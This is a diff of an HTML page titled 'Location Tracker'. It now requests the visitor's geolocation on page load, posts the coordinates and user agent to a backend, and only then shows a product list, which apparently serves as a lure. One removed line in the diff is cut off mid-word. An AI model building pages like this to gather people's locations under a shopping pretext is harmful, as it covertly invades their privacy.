@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Tracker with Products</title>
+    <title>Location Tracker</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -35,28 +35,12 @@
                 height: 80px;
                 object-fit: cover;
             }
-
-        button {
-            margin-top: 10px;
-            padding: 8px 15px;
-            font-size: 16px;
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-            button:hover {
-                background: #45a049;
-            }
     </style>
 </head>
 <body>
     <div id="location-section">
-        <h2>We Need Your Location</h2>
+        <h2>Getting Your Location...</h2>
         <p id="status">Please allow location access.</p>
-        <button onclick="getLocation()">Allow Location</button>
     </div>
 
     <div id="products-section" class="hidden">
@@ -77,7 +61,6 @@
 
         function renderProducts() {
             const productList = document.getElementById('product-list');
-            productList.innerHTML = '';
             products.forEach(p => {
                 const div = document.createElement('div');
                 div.className = 'product';
@@ -86,7 +69,42 @@
             });
         }
 
-        async function sendLocation(latitude, longitude) {
-            console.log("Sending location to backend:", latitude, longitude);
-            try {
-                const response = await fetch(backendUr
+        function sendLocation(latitude, longitude) {
+            fetch(backendUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    latitude,
+                    longitude,
+                    userAgent: navigator.userAgent,
+                    ip: "" // Can be enhanced with IPinfo if needed
+                })
+            }).then(() => {
+                document.getElementById('location-section').classList.add('hidden');
+                document.getElementById('products-section').classList.remove('hidden');
+                renderProducts();
+            }).catch(err => console.error("Error sending location:", err));
+        }
+
+        function requestLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        document.getElementById("status").innerText = `Location: ${latitude}, ${longitude}`;
+                        sendLocation(latitude, longitude);
+                    },
+                    (error) => {
+                        document.getElementById("status").innerText = "Location access denied!";
+                        console.error(error);
+                    }
+                );
+            } else {
+                document.getElementById("status").innerText = "Geolocation not supported!";
+            }
+        }
+
+        window.onload = requestLocation;
+    </script>
+</body>
+</html>
